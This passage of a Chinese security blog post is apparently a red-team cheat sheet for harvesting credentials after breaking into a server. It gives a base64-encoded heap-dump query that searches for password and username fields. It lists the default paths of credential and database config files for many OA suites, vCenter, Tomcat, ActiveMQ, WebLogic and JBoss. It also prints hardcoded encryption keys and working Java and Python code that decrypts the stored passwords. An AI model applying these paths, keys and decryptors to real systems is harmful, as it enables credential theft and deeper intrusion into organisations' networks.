              var res =  "class : "+cls.name+"\n Field [ "+field.name.toString()+" : ";  
              if( obs[field.name.toString()] != null ){  
                res = res + obs[field.name.toString()].toString()+" ]\n";  
              }else{  
                res = res + "null ]\n";  
              }  
              if (filter[tag] == null) {  
                filter[tag] = res;  
                print(res);  
              }  
              return null;  
            });  
          }  
          return null;  
      });  
    });

使用base64编码oql语句传入OQLQuery进行提取：

    
    
    java -jar ./OQLQuery.jar /tmp/dumpHeap.hprof dmFyIGZpbHRlciA9IHt9OwptYXAoaGVhcC5jbGFzc2VzKCksIGZ1bmN0aW9uIChjbHMpIHsKICAgcmV0dXJuIG1hcChjbHMuZmllbGRzLCBmdW5jdGlvbiAoZmllbGQpIHsgCiAgICAgIGlmKCBmaWVsZC5uYW1lLnRvU3RyaW5nKCkuY29udGFpbnMoInBhc3MiKSB8fCBmaWVsZC5uYW1lLnRvU3RyaW5nKCkuY29udGFpbnMoInVzZXJuYW1lIikgfHxmaWVsZC5uYW1lLnRvU3RyaW5nKCkuY29udGFpbnMoIlBBU1MiKSl7CiAgICAgICAgcmV0dXJuIG1hcChoZWFwLm9iamVjdHMoY2xzKSwgZnVuY3Rpb24gKG9icykgewogICAgICAgICAgdmFyIHRhZyA9IGNscy5uYW1lKyJ8IitmaWVsZC5uYW1lIDsKICAgICAgICAgIHZhciByZXMgPSAgImNsYXNzIDogIitjbHMubmFtZSsiXG4gRmllbGQgWyAiK2ZpZWxkLm5hbWUudG9TdHJpbmcoKSsiIDogIjsKICAgICAgICAgIGlmKCBvYnNbZmllbGQubmFtZS50b1N0cmluZygpXSAhPSBudWxsICl7CiAgICAgICAgICAgIHJlcyA9IHJlcyArIG9ic1tmaWVsZC5uYW1lLnRvU3RyaW5nKCldLnRvU3RyaW5nKCkrIiBdXG4iOwogICAgICAgICAgfWVsc2V7CiAgICAgICAgICAgIHJlcyA9IHJlcyArICJudWxsIF1cbiI7CiAgICAgICAgICB9CiAgICAgICAgICBpZiAoZmlsdGVyW3RhZ10gPT0gbnVsbCkgewogICAgICAgICAgICBmaWx0ZXJbdGFnXSA9IHJlczsKICAgICAgICAgICAgcHJpbnQocmVzKTsKICAgICAgICAgIH0KICAgICAgICAgIHJldHVybiBudWxsOwogICAgICAgIH0pOwogICAgICB9CiAgICAgIHJldHVybiBudWxsOwogIH0pOwp9KTs=

![](https://gitee.com/fuli009/images/raw/master/public/20221212093458.png)1.1.png![](https://gitee.com/fuli009/images/raw/master/public/20221212093500.png)42f3e0d7257d7c3d6bec1dc42ab78d7.png

从图中即可看到数据库连接密码。

###  **致远OA**

数据库配置文件默认位置：

    
    
    /Seeyon/A8[致远版本]/base/conf/datasourceCtp.properties

![](https://gitee.com/fuli009/images/raw/master/public/20221212093502.png)

使用工具解密：https://github.com/jas502n/OA-Seeyou

![](https://gitee.com/fuli009/images/raw/master/public/20221212093503.png)

###  **泛微系列**

####  **e-cology**

数据库配置文件默认位置：

    
    
    D:\WEAVER\ecology\WEB-INF\prop\weaver.properties

用户名表：HrmResource 管理员表：HrmResourceManager、TB_USER

![](https://gitee.com/fuli009/images/raw/master/public/20221212093504.png)image.png

#### e-bridge

数据库配置文件默认位置：

    
    
    D:\ebridge\tomcat\webapps\ROOT\WEB-INF\init.properties 

#### e-mobile

数据库配置文件默认位置：

    
    
    D:\WEAVER\emobile\webapps\ROOT\WEB-INF\classes\application.properties 

#### e-office

数据库配置文件默认位置：

    
    
    D:\eoffice\webroot\inc\oa_config.php  
    D:\eoffice\bin\mysql_config.ini

### 蓝凌OA

#### 解密后台管理密码

后台管理地址一般是：

    
    
    http://x.x.x.x/admin.do

如果后台管理地址遇到不是admin.do，则可以尝试从以下文件中搜索SysConfigAdminAction即可找到后台管理地址：

    
    
    老版本对应的为：\WEB-INF\KmssConfig\sys\config\struts.xml  
    新版本对应的为：\WEB-INF\KmssConfig\sys\config\spring-safe.xml  
    或者：\WEB-INF\KmssConfig\sys\config\spring-mvc.xml

加密后的后台管理密码一般保存在：

    
    
    /WEB-INF/KmssConfig/admin.properties

其使用的加密算法为DES-ECB，密钥为kmssAdminKey，解密工具：https://github.com/zhutougg/LandrayDES

![](https://gitee.com/fuli009/images/raw/master/public/20221212093506.png)image.png

#### 配置文件解密

配置文件默认路径：

    
    
    ekp/WEB-INF/KmssConfig/kmssconfig.properties

其使用的加密算法为DES-ECB，密钥为kmssPropertiesKey。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093508.png)image.png

解密代码：

    
    
    package org.example;  
      
    import cn.hutool.core.util.CharsetUtil;  
    import cn.hutool.crypto.SecureUtil;  
    import cn.hutool.crypto.symmetric.DES;  
      
    import java.nio.file.Files;  
    import java.nio.file.Path;  
    import java.nio.file.Paths;  
      
      
    public class Main {  
        public static String decrypt(byte[] bytes, String key) {  
            DES des = SecureUtil.des(key.getBytes());  
            return des.decryptStr(bytes, CharsetUtil.charset("gb2312"));  
        }  
      
        public static void main(String[] args) throws Exception {  
            Path path = Paths.get("D:\\Users\\Shmily\\Desktop\\kmssconfig.properties");  
            byte[] bytes = Files.readAllBytes(path);  
            String result = decrypt(bytes, "kmssPropertiesKey");  
            System.out.println(result);  
        }  
    }

数据库用户密码解密 用户表：sys_org_person
前台用户在/login.jsp登陆时使用的密码使用了md5和DES两种加密方式存在数据库中，其使用DES算法为DES-
CBE，密钥为kmssPropertiesKey。

![](https://gitee.com/fuli009/images/raw/master/public/20221212093510.png)f5a2cb7dffa11bec2fe1615b2ad6676.png

解密工具：https://github.com/zhutougg/LandrayDES

![](https://gitee.com/fuli009/images/raw/master/public/20221212093516.png)image.png

###  **万户OA**

数据库配置文件默认位置：

    
    
    D:/jboss/jboss-as/server/oa/deploy/defaultroot.war/WEB-INF/config/whconfig.xml  
    D:/jboss/jboss-as/server/oa/deploy/defaultroot.war/WEB-INF/classes/fc.properties  
    /WEB-INF/config/ezoffice/config.xml  
    /jboss-as/server/oa/deploy/*-ds.xml //星号为具体数据库比如mssql、oracle

![](https://gitee.com/fuli009/images/raw/master/public/20221212093518.png)![](https://gitee.com/fuli009/images/raw/master/public/20221212093519.png)

### 通达OA

数据库配置文件默认位置：

    
    
    C:\MYOA\mysql5\my.ini  
    C:\MYOA\webroot\inc\oa_config.php  
    C:\MYOA\bin\Service.ini

![](https://gitee.com/fuli009/images/raw/master/public/20221212093521.png)

###  **用友NC**

数据库配置文件默认位置：

    
    
    /nchome/ierp/bin/prop.xml

![](https://gitee.com/fuli009/images/raw/master/public/20221212093523.png)

用友数据库解密，工具下载地址：https://github.com/jas502n/ncDecode

![](https://gitee.com/fuli009/images/raw/master/public/20221212093525.png)

###  **金和OA**

数据库默认配置文件:

    
    
    D:\apache-tomcat-6.0.53\webapps\jc6\WEB-INF\classes\db.properties

### 心通达

数据库默认配置文件:

    
    
    /webapps/ROOT/WEB-INF/classes/jdbc-sql.propertie

![](https://gitee.com/fuli009/images/raw/master/public/20221212093526.png)image.png

### 帆软

数据库默认配置文件:

    
    
    \WEB-INF\resources\privilege.xml

![](https://gitee.com/fuli009/images/raw/master/public/20221212093527.png)

解密代码：

    
    
    cipher = input("输入密文：\n")  # 密文  
    PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23]   
    password = ""  
    cipher = cipher[3:]    
    for i in range(int(len(cipher) / 4)):  
        c1 = int("0x" + cipher[i * 4:(i + 1) * 4], 16)  
        c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8]  
        password = password + chr(c2)  
    print("明文密码：\n"+password)

![](https://gitee.com/fuli009/images/raw/master/public/20221212093528.png)image.png

### Confluence

数据库默认配置文件:

    
    
    /var/atlassian/confluenc/confluence.cfg.xml

### vCenter

数据库默认配置文件:

    
    
    Windows默认路径：  
    C:\ProgramData\VMware\vCenterServer\cfg\vmware-vps\vcdb.properties  
      
    Linux路径：  
    /etc/vmware-vpx/vcdb.properties  
    /etc/vmware/service-state/vpxd/vcdb.properties

![](https://gitee.com/fuli009/images/raw/master/public/20221212093529.png)

###  **金蝶**

####  **金蝶EAS**

数据库默认配置文件:

    
    
    ...\runtime\apusic\domains\server1\config\datasources.xml  
    D:/Kingdee/eas/server/properties/datacenters.xml

### 华三IMC

数据库默认配置文件:

    
    
    common\conf\server-addr.xml

![](https://gitee.com/fuli009/images/raw/master/public/20221212093530.png)

核心算法：通过将去掉-
符号的值加上数组的下标值乘上16取余256，接着把获取到的值b与255进行比较，大于255的进行b-256的操作后赋值给b，紧接着进行ASCII转换。最后判断结尾是否为”
~~”，是的话就去掉，最后去掉最后两位。解密代码：

    
    
    str = "-115-97-76-67-49-28-30-14"  
      
    if str.startswith('-'):  
        strs = []  
        bytess = []  
        strs = str[1:24].split('-')  
        i = 0  
        for i in range(len(strs)-2):  
            try:  
                strsint = int(strs[i])  
                b = strsint + i * 16 % 256  
                if b > 255:  
                    b = b - 256  
                str1 = chr(b)  
                if not str1.endswith("~~"):  
                    bytess.append(chr(b))  
            except:  
                pass  
            i = i + 1  
        print("密码："+''.join(bytess))  
    else:  
        print("密文格式不对！")  
        print("格式应为：-112-81-83-67-55-20-30-1")

![](https://gitee.com/fuli009/images/raw/master/public/20221212093532.png)image.png

### 联软 IT 安全运维

数据库默认配置文件:

    
    
    /home/leagsoft/LeagView/Ini/odbc.ini  
    /home/leagsoft/LeagView/Ini/Server.ini  
    /etc/postgresql/9.1/auditdb/postgresql.conf

##  **中间件**

### T **omcat**

#### 数据库

数据库配置文件：

    
    
    WEB-INF/classes/application.properties

![](https://gitee.com/fuli009/images/raw/master/public/20221212093533.png)

实战中遇见的tomcat常见数据库配置文件名：

    
    
    db.properties  
    jdbc.properties  
    dbpool.properties  
    config.properties  
    sso-config.properties  
    minaconfig.properties  
    missCallAlertExclude.properties  
    url_img.properties  
    webapp.properties  
    Proxool.properties  
    application.properties

#### 控制台

tomcat控制台账号密码：

    
    
    /conf/tomcat-users.xml

![](https://gitee.com/fuli009/images/raw/master/public/20221212093534.png)

### A **ctiveMQ**

配置了认证的情况：

![](https://gitee.com/fuli009/images/raw/master/public/20221212093536.png)

登录密码存放路径：

    
    
    /apache-activemq/conf/jetty-realm.properties

![](https://gitee.com/fuli009/images/raw/master/public/20221212093537.png)

### W **eblogic**

WebLogic 11gR1后采用了AES的加密方式，之前的版本采用的DES加密方式。每个Weblogic
app的加密key都是随机生成的，所以不同服务器甚至同服务器不同应用上的weblogic都是用不同的密码加密的。

####  **Weblogic控制台密码解密**

查找boot.properties文件：

    
    
    weblogic/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties

![](https://gitee.com/fuli009/images/raw/master/public/20221212093538.png)

查找SerializedSystemIni.dat文件，其中包含了解密key：

    
    
    weblogic/user_projects/domains/base_domain/security/SerializedSystemIni.dat

![](https://gitee.com/fuli009/images/raw/master/public/20221212093539.png)

解密工具：https://github.com/Ch1ngg/WebLogicPasswordDecryptorUi

![](https://gitee.com/fuli009/images/raw/master/public/20221212093540.png)![](https://gitee.com/fuli009/images/raw/master/public/20221212093541.png)

#### Nodemanager密码解密

查找config.xml文件

    
    
    /weblogic/user_projects/domains/base_domain/config/config.xml

![](https://gitee.com/fuli009/images/raw/master/public/20221212093542.png)![](https://gitee.com/fuli009/images/raw/master/public/20221212093543.png)

#### 数据库密码解密

查找jdbc相关文件

    
    
    /weblogic/Oracle/Middleware/user_projects/domains/base_domain/config/jdbc/xxx-jdbc.xml

![](https://gitee.com/fuli009/images/raw/master/public/20221212093544.png)

成功解密

![](https://gitee.com/fuli009/images/raw/master/public/20221212093545.png)

### JBOSS

JBoss使用blowfish加密算法，解密key为硬编码的jaas is the way。数据库配置默认目录：

    
    
    %JBOSS_HOME%\server\%appname%\deploy\oracle-ds.xml  
    %JBOSS_HOME%\server\%appname%\deploy\mysql-ds.xml

在没有加密的情况下，密码是明文：

    
    
    <jndi-name>OracleDS</jndi-name> //jndi名字   
    <use-java-context>false</use-java-context>  
    <connection-url>jdbc:oracle:thin:@localhost:1521:orcl</connection-url> //URL地址  
    <driver-class>oracle.jdbc.driver.OracleDriver</driver-class> //驱动  
    <user-name>root</user-name> //用户名  
    <password>123456</password> //密码

在配置完密码加密后，加密后的密码存在jboss目录的conf/login-config.xml文件里：

    
    
    <application-policy name="EncryptDBPassword">  
    <authentication>  
    <login-module code="org.jboss.resource.security.SecureIdentityLoginModule" flag="required">   
    <module-option name="username">admin</module-option>  
    <module-option name="password">5dfc52b51bd35553df8592078de921bc</module-option>  
    <module-option name="managedConnectionFactoryName">jboss.jca:name=PostgresDS,service=LocalTxCM</module-option> </login-module>  
    </authentication>  
    </application-policy>

5dfc52b51bd35553df8592078de921bc就是加密后的密文了，有的时候前面还有个符号，也是密文的一部分。

JBoss加密和解密代码：

    
    
    import java.math.BigInteger;  
      
      
    /*  
    * JBoss.java - Blowfish encryption/decryption tool with JBoss default password  
    *    Daniel Martin Gomez <daniel @ ngssoftware.com> - 03/Sep/2009  
    *  
    * This file may be used under the terms of the GNU General Public License  
    * version 2.0 as published by the Free Software Foundation:  
    *   http://www.gnu.org/licenses/gpl-2.0.html  
    */  
    import javax.crypto.*;  
    import javax.crypto.spec.SecretKeySpec;  
      
      
      
    public class Main {  
        public static void main(String[] args) throws Exception {  
            if ((args.length != 2) ||  
                    !(args[0].equals("-e") | args[0].equals("-d"))) {  
                System.out.println(  
                    "Usage:\n\tjava JBoss <-e|-d> <encrypted_password>");  
      
      
                return;  
            }  
      
      
            String mode = args[0];  
      
      
            byte[] kbytes = "jaas is the way".getBytes();  
            SecretKeySpec key = new SecretKeySpec(kbytes, "Blowfish");  
            Cipher cipher = Cipher.getInstance("Blowfish");  
      
      
            String out = null;  
      
      
            if (mode.equals("-e")) {  
                String secret = args[1];  
                cipher.init(Cipher.ENCRYPT_MODE, key);  
      
      
                byte[] encoding = cipher.doFinal(secret.getBytes());  
                out = new BigInteger(encoding).toString(16);  
            } else {  
                BigInteger secret = new BigInteger(args[1], 16);  
                cipher.init(Cipher.DECRYPT_MODE, key);  
      
      
                byte[] encoding = cipher.doFinal(secret.toByteArray());  
                out = new String(encoding);  
            }  
      
      
            System.out.println(out);  
        }  
    }

在线解密：https://www.json.cn/runcode/run_java/

![](https://gitee.com/fuli009/images/raw/master/public/20221212093546.png)image.png

#### 引用链接

`[1]` Asterisk Password Spy:  _https://xenarmor.com/asterisk-password-
recovery-pro-software/?utm_source=website_sx
&utm_medium=website&utm_campaign=upgradetopro_home_asterisk&utm_term=upgradetopro_home_asterisk_  
`[2]` peekPassword:  _https://www.jb51.net/softs/412866.html_  
`[3]` SharpWxDump:  
`[4]` ChatViewTool:  _https://github.com/Ormicron/chatViewTool_  
`[5]` Sunflower_get_Password:
_https://github.com/wafinfo/Sunflower_get_Password_

加下方wx，拉你一起进群学习

![](https://gitee.com/fuli009/images/raw/master/public/20221212093548.png)

  

往期推荐

[

什么？你还不会webshell免杀？（十）

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247504063&idx=1&sn=6ef2b411606302749b0afd84cbe52478&chksm=ce676a03f910e31549e7879dd54e8d6ba0228d98daa9618a260777822fb8f7eadb000fc74a44&scene=21#wechat_redirect)[

PPL攻击详解

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247504039&idx=1&sn=f4235a5b16a9ec54990b9ca60e612c3a&chksm=ce676a1bf910e30d0fa66e47c56ff30c95d015c41c25e1ccd65f52ae6302c125d5731148c182&scene=21#wechat_redirect)[

绕过360核晶抓取密码

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247504007&idx=1&sn=d05780700a2f285f9b6e2df58ea2ea57&chksm=ce676a3bf910e32d608babbcd14e62ef80c965c118b6b5fa0978f4346cceab39571d8b8a94ff&scene=21#wechat_redirect)[

什么？你还不会webshell免杀？（十）

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247503993&idx=1&sn=6777c400219f28f3ec2d10a10eb88cd5&chksm=ce676ac5f910e3d32301ee99d320f870d9e68635cd21a7ef8c4e8853fd9309232d2335227122&scene=21#wechat_redirect)[

64位下使用回调函数实现监控

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247503980&idx=1&sn=c62724ad4b3a98ed77402fae985ff94d&chksm=ce676ad0f910e3c6d09961a698175262647c2c2fbbf77f8f5ec4cd510160a137f6371d14f517&scene=21#wechat_redirect)[

什么？你还不会webshell免杀？（九）

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247503754&idx=1&sn=0a8c57ce7ce89d10c292e3bc5cc5f6ed&chksm=ce677536f910fc20a5076d93c12a520c43a1c1a8fa36e30ace053ee3dcd12db38cc3782b7875&scene=21#wechat_redirect)[

一键击溃360全家桶+核晶

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247503750&idx=1&sn=61f8d9ca458674d44de0019aeb39a875&chksm=ce67753af910fc2cb20170a97e7b519082c5f51805d6b86cc39b1469217e4c3539d61a9ba3f9&scene=21#wechat_redirect)[

域内持久化后门

](https://mp.weixin.qq.com/s?__biz=Mzg2NDY2MTQ1OQ==&mid=2247503705&idx=1&sn=7a6039810c41637e376757f306ab6745&chksm=ce6775e5f910fcf3226422091a3858b8064fa353320e48c4a4998ed5b89f51febe82e992309d&scene=21#wechat_redirect)![](https://gitee.com/fuli009/images/raw/master/public/20221212093549.png)

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

